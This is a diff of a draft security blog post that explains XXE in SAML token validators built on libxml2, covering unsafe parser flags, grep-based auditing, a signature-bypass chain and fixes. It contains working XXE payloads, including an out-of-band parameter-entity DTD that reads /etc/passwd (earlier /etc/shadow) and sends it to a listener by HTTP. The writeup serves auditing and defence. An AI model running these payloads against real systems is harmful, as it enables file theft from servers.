@@ -5,50 +5,95 @@ tags: ["xxe", "saml", "methodology"]
 slug: "saml-parser-xxe"
 translationKey: saml-parser-xxe
 draft: true
-summary: "Why SAML token validators are a soft spot for XXE, how the libxml2 defaults betray them, and how I look for it."
+summary: "Why SAML token validators are a soft spot for XXE, how the libxml2 defaults betray them, and how I look for it — from first principles."
 ---
 
-SAML is XML, and XML parsers read external entities unless you tell them not to. Put those
-two facts next to each other and you get one of the most reliable places to find XXE: the
-code that validates a SAML token.
+SAML is XML, and XML parsers will read files off the disk for you unless you specifically
+tell them not to. Those two facts, sitting next to each other, are the whole bug. The code
+that validates a SAML token is one of the most reliable places to find XXE, and this post
+is about why — starting from the beginning, so it makes sense even if you've never fired an
+XXE payload.
 
 This is a class writeup, not a specific bug. No product, no vendor. If you audit anything
-that speaks SAML — an SSO integration, a token validation service, a guest agent that
+that speaks SAML — an SSO login flow, a token validation service, an agent that
 authenticates over a socket — this is the shape to look for.
+
+## First, what XXE actually is
+
+XML lets you define shortcuts called **entities**. You've seen the built-in ones: `&lt;`
+becomes `<`, `&amp;` becomes `&`. You can also declare your own:
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY greeting "hello">
+]>
+<foo>&greeting;</foo>
+```
+
+When the parser reads this, `&greeting;` gets replaced with `hello`. So far, harmless — it's
+just find-and-replace inside the document.
+
+The dangerous part is that an entity's value doesn't have to be text you wrote inline. It can
+point at something **external** — a file, a URL:
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+]>
+<foo>&secret;</foo>
+```
+
+Now `&secret;` means *"go open `/etc/passwd` and paste its contents here."* If the parser is
+configured to resolve external entities, it will do exactly that — read the file and drop the
+contents into the document. That is **XXE**: XML eXternal Entity injection. The attacker's
+XML tells the parser to fetch things it was never supposed to touch — local files, or URLs on
+the internal network (which is how XXE turns into SSRF).
+
+The rules for which entities the parser resolves come from the **DTD** (Document Type
+Definition) — the block inside `<!DOCTYPE ... [ ... ]>`. The DTD can live inside the document,
+or the document can say *"load my DTD from over there"* and point at a URL. Both of those are
+levers we'll pull.
+
+The one-line summary: **if a parser expands entities and is willing to reach out to files and
+URLs, anyone who controls the XML can make it read things.** SAML tokens are attacker-supplied
+XML. You see where this goes.
 
 ## Why the validator, specifically
 
-A SAML assertion has to be parsed before it can be checked. The order is always the same:
+Here's the part that trips people up. "The SAML token is signed," they say, "so an attacker
+can't forge one." True — but irrelevant, and here's why.
 
-1. Parse the XML into a document tree
+To check a signature, you first have to have the document in memory. So the validator always
+does this, in this order:
+
+1. **Parse** the XML into a tree in memory
 2. Validate the schema
 3. Check the subject, the conditions, the timestamps
 4. **Verify the signature**
 
-The signature is step four. The parse is step one. Anything that happens during the parse
-has already happened by the time the signature is looked at — and XXE happens during the
-parse.
+The signature check is step four. Entity expansion — the file read — happens in step one,
+during the parse. By the time the code reaches step four and says *"this signature is
+garbage, reject it,"* the file has already been read and, as you'll see, already sent to you.
 
-So the usual mental model, "the token is signed, an attacker can't touch it," is
-irrelevant here. The attacker isn't tampering with a trusted token. They're sending a
-malicious one, and the damage is done before the code ever gets to the part that would
-reject it. An invalid signature at step four is too late.
+So we're not forging a valid token. We're sending a **deliberately invalid** one whose only
+job is to carry the malicious entities. The token gets rejected at step four every single
+time — and we don't care, because the payload fired at step one.
 
 ```goat
-  attacker token   .-------------.  entities expand   .------------.
+  attacker token   .-------------.  entity expands    .------------.
   (bad signature)->|  parse XML  |----- file read --->|  /etc/...  |
                    '------+------'   HTTP exfil        '------------'
                           |
-                          v
-                   .-------------.
-                   |  validate   |  <- signature checked here, too late
+                          v          the read already happened up there;
+                   .-------------.   this rejection is too late to matter
+                   |  validate   |
                    '-------------'
 ```
 
 ## The libxml2 trap
 
-Most C and C++ code that parses SAML sits on top of libxml2, and libxml2's flags are where
-this goes wrong. A parse call that looks responsible:
+Most C and C++ code that handles SAML sits on top of **libxml2**, and libxml2 does whatever
+flags you pass it. This is where the bug usually lives. A parse call that looks careful:
 
 ```c
 doc = xmlReadMemory(token, len, NULL, NULL,
@@ -57,27 +102,35 @@ doc = xmlReadMemory(token, len, NULL, NULL,
                     XML_PARSE_DTDLOAD);   // load external DTDs
 ```
 
-`XML_PARSE_NOENT` expands entities. `XML_PARSE_DTDLOAD` fetches external DTDs. Together
-they are exactly the two things XXE needs. What's missing is `XML_PARSE_NONET` — the one
-flag that would stop the parser from reaching out over the network.
+Read those three flags as plain English:
 
-Two more global switches decide the same thing at the library level, and code that never
-touches them inherits the unsafe default:
+- `XML_PARSE_NOENT` — *"expand entities"* (yes, the name is backwards; it means substitute
+  them, not skip them)
+- `XML_PARSE_DTDLOAD` — *"if the document points at an external DTD, go fetch it"*
+- The missing one: `XML_PARSE_NONET` — *"never use the network."*
+
+That last flag is the seatbelt, and it isn't buckled. With `DTDLOAD` on and `NONET` off, the
+parser will happily make network requests while parsing. Combined with entity expansion,
+that's a fully loaded XXE.
+
+Two library-wide switches do the same thing at a lower level, and code that never sets them
+inherits the unsafe default from older libxml2 versions:
 
 ```c
-xmlSubstituteEntitiesDefault(1);   // 1 = expand (unsafe default in old code)
+xmlSubstituteEntitiesDefault(1);   // 1 = expand entities
 xmlLoadExtDtdDefaultValue = 1;     // 1 = load external DTDs
 ```
 
-A common failure I keep seeing: a safe path exists in the source, guarded by an `#ifdef`
-that is never defined. The developer wrote the fix, wrapped it in a build flag "for later,"
-and the vulnerable `#else` branch is the one that actually compiles. Reading the source
-isn't enough — you have to know which branch shipped.
+One pattern I keep running into: the safe version of the code **exists**, but it's wrapped in
+an `#ifdef` that the build never defines. Someone wrote the fix, parked it behind a compile
+flag "to enable later," and the vulnerable `#else` branch is the one that actually ships.
+Reading the source tells you the fix is there; it doesn't tell you it's turned on. You have to
+check which branch compiled.
 
-## Turning it into a file read
+## Turning it into a file read, step by step
 
-A parse that loads external DTDs will follow this. The token carries a parameter entity
-pointing at a DTD you host:
+Let's build the payload slowly. The token we send carries a DTD that points at a server **we**
+control:
 
 ```xml
 <?xml version="1.0"?>
@@ -90,79 +143,102 @@ pointing at a DTD you host:
 </saml:Assertion>
 ```
 
-The DTD you serve back reads a local file and smuggles it out in a second request — this is
-the standard out-of-band pattern, because the file contents never appear in the parser's
-own output:
+Two things to notice:
+
+- `%dtd;` uses a `%`, not a `&`. That's a **parameter entity** — an entity used inside the DTD
+  itself, rather than in the document body. We need it because the trick below only works with
+  parameter entities.
+- The `saml:Assertion` at the bottom is just enough shape to look like a token. It doesn't
+  need a valid signature. It doesn't need to be a real assertion. It only needs to reach the
+  parser.
+
+When the validator parses this, it hits `%dtd;` and fetches `http://127.0.0.1:9090/x.dtd` from
+our server. Here's what we serve back:
 
 ```xml
-<!ENTITY % file SYSTEM "file:///etc/shadow">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://127.0.0.1:9090/?d=%file;'>">
 %wrap;
 %exfil;
 ```
 
-The parser fetches the DTD, opens the file, and makes an HTTP request to your listener with
-the contents in the query string. If the validator runs as a privileged user, "the file"
-can be anything that user can read.
+Walk through what the parser does with it:
 
-Two details matter for whether this is exploitable:
+1. `%file` — opens `/etc/passwd`, holds its contents.
+2. `%wrap` — builds a **new** entity, `exfil`, whose value is a URL with the file contents
+   glued into the query string.
+3. `%exfil;` — resolves that entity, which makes the parser request
+   `http://127.0.0.1:9090/?d=<contents of /etc/passwd>`.
 
-- **Direct vs. out-of-band.** If the parsed result is ever reflected back to you, a simple
-  `file:///` entity is enough. If not — and validators usually reject the token — you need
-  the parameter-entity DTD trick above, so the read leaves over your own channel instead of
-  through the response.
-- **Local files can't contain certain characters** inside an entity (`%`, `&`, newlines can
-  break the wrapping). For `/etc/passwd`-style files it's fine; for anything with awkward
-  bytes you switch to a PHP-`filter`-style base64 wrapper if the target stack allows it.
+Our server, which is also the listener, receives a request whose query string **is the file**.
+That's the read, exfiltrated.
+
+Why the two-server dance instead of just `file:///etc/passwd` directly? Because a validator
+almost never shows you the parsed document — it rejects the token and returns an error. So the
+file contents can't come back to us *through the response*. Instead we make the parser mail
+them to us over a side channel: its own outbound HTTP request. That's the **out-of-band (OOB)**
+pattern, and the nested-parameter-entity DTD above is the standard way to do it.
+
+Two gotchas that decide whether it fires:
+
+- **If** the app ever reflects the parsed value back to you, skip all of this — a plain
+  `file:///` entity in the token is enough, and you read the file straight from the response.
+  OOB is the fallback for the common case where nothing comes back.
+- **Some file contents break the payload.** A `%`, an `&`, or a raw newline inside the file can
+  corrupt the entity wrapping. `/etc/passwd` and `/etc/hostname` are fine. For messier files,
+  if the stack supports it, you wrap the read in a base64 filter so the bytes survive transit.
 
 ## When there's a signature in the way
 
-Sometimes the validator won't even parse an unsigned token — it bails early. That's where a
-second, separate weakness turns a "maybe" into a "yes": an authentication path that can be
-told to skip signature verification.
+Sometimes the validator refuses to parse an unsigned token at all — it checks *something*
+before parsing and bails. That kills the OOB read before it starts. This is where a **second,
+independent weakness** can revive it: an auth path that lets you skip the signature check.
 
-I've seen this as a "trusted caller" flag — a field that says *this token was already
-verified upstream, don't check it again* — that the service accepts from callers who are not,
-in fact, trusted. On its own that's an auth bypass. Combined with the XXE it removes the last
-obstacle: the parser runs on your input with nothing standing in front of it.
+I've run into this as a *"trusted caller"* flag — a field in the request that essentially says
+*"this token was already verified further upstream, don't bother checking it again"* — which
+the service accepts from callers who are, in reality, not trusted at all. On its own that's an
+authentication bypass. Chained with the XXE, it clears the last gate: now the parser runs your
+input with nothing in front of it.
 
-The lesson isn't the specific flag. It's that XXE in a validator is worth chasing even when
-there's a signature check, because signature checks are exactly the kind of thing that gets a
-`// TODO: actually verify this` and ships anyway.
+The takeaway isn't the specific flag. It's that XXE in a validator is worth chasing **even
+when** there's a signature check standing in the way — because signature checks are exactly
+the kind of code that ends up with a `// TODO: actually verify this` and ships anyway.
 
 ## How I look for it
 
-Source available:
+**Source available.** Grep for the parse calls and the switches:
 
 ```bash
-# the parse calls
+# where XML gets parsed
 grep -rn "xmlReadMemory\|xmlParseMemory\|xmlReadDoc\|xmlCtxtReadMemory" .
-# the global switches
+# the library-wide switches
 grep -rn "xmlSubstituteEntitiesDefault\|xmlLoadExtDtdDefaultValue" .
-# safe paths hidden behind a build flag
-grep -rn "XML_PARSE_NONET" .        # then check it's actually compiled
+# a safe path that might be hidden behind a build flag
+grep -rn "XML_PARSE_NONET" .        # then confirm it actually compiles
 ```
 
-If `XML_PARSE_NONET` is absent from a parse that loads DTDs, or present only inside an
-`#ifdef` that the build never sets, you have a candidate.
+If a parse loads DTDs but has no `XML_PARSE_NONET` — or has it only inside an `#ifdef` the
+build never sets — you have a candidate. Confirm which branch shipped before you get excited.
 
-Black box: send a token whose DTD points at a host you control and watch for the callback.
-An out-of-band listener — your own HTTP server, or a Collaborator-style service — is the
-only reliable oracle, because the validator will almost always reject the token and tell you
-nothing useful in the response. The rejection is expected. The callback is the finding.
+**Black box.** Send a token whose DTD points at a host you control, and watch that host for a
+callback. An OOB listener — your own HTTP server, or a Collaborator-style service — is the only
+reliable oracle here, because the validator will almost always reject the token and tell you
+nothing in the response. **The rejection is expected. The callback is the finding.** If the
+request never arrives, entity resolution is probably off, and you move on.
 
 ## Confirming without overreaching
 
-Point the exfil at a file you're allowed to read — on a system you own, `/etc/hostname` or a
-file you dropped yourself — not at secrets, and not on infrastructure you don't have
-permission to test. The callback proves the entity resolved and the read happened; you don't
-need to pull `/etc/shadow` to demonstrate the vulnerability, and on someone else's system you
-shouldn't. Prove the mechanism, stop, report.
+Point the exfil at a file you're allowed to read — on a box you own, `/etc/hostname` or a file
+you dropped yourself — not at secrets, and never at infrastructure you don't have permission to
+test. The callback alone proves the entity resolved and the read happened. You do **not** need
+to pull `/etc/shadow` to demonstrate the vulnerability, and on someone else's system you
+shouldn't. Prove the mechanism, stop, write it up. A screenshot of your listener receiving a
+file you were allowed to read is a complete proof.
 
 ## The fix
 
-For the parser: add `XML_PARSE_NONET`, and don't rely on a build flag to enable the safe
-path — compile it unconditionally.
+For the parser: add `XML_PARSE_NONET`, and don't hide the safe path behind a build flag —
+compile it unconditionally.
 
 ```c
 doc = xmlReadMemory(token, len, NULL, NULL,
@@ -170,13 +246,16 @@ doc = xmlReadMemory(token, len, NULL, NULL,
                     | XML_PARSE_NONET);
 ```
 
-Better still, a SAML validator has no reason to load external DTDs at all — disable entity
-expansion entirely (`xmlSubstituteEntitiesDefault(0)`, `xmlLoadExtDtdDefaultValue = 0`) and
-parse with the network off. And whatever "skip the signature" path exists should be gated on
-the caller actually being privileged, not on a flag the caller sets themselves.
+Better still: a SAML validator has no business loading external DTDs in the first place. Turn
+entity expansion off entirely (`xmlSubstituteEntitiesDefault(0)`,
+`xmlLoadExtDtdDefaultValue = 0`) and parse with the network disabled. Defence in depth, and you
+lose nothing — real SAML tokens don't need external DTDs. And any "skip the signature" path
+should be gated on the caller genuinely being privileged, not on a flag the caller sets for
+itself.
 
 ## Takeaway
 
-When you see SAML, think: *what parses this, and with which flags?* The signature is a
-distraction — the interesting code runs before it. Find the parse call, check for
-`XML_PARSE_NONET`, and if it's missing, you're one out-of-band callback away from knowing.
+When you see SAML, ask one question: **what parses this, and with which flags?** The signature
+is a distraction — the interesting code runs before it. Find the parse call, check for
+`XML_PARSE_NONET`, and if it's missing, you're one out-of-band callback away from knowing for
+sure.
